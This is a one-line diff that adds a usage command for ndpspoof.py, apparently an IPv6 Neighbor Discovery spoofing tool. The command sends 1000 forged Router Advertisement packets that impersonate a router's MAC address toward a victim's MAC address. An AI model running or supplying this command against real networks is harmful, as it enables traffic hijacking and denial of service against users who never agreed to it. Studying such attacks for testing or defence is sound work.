@@ -1,0 +1,1 @@
+python3 ndpspoof.py --src-mac (Router Mac-Address For Spoofing) --dst-mac (Victim Mac-Address) --iface ens33 --count 1000 --interval 000.1 --packet-type ra
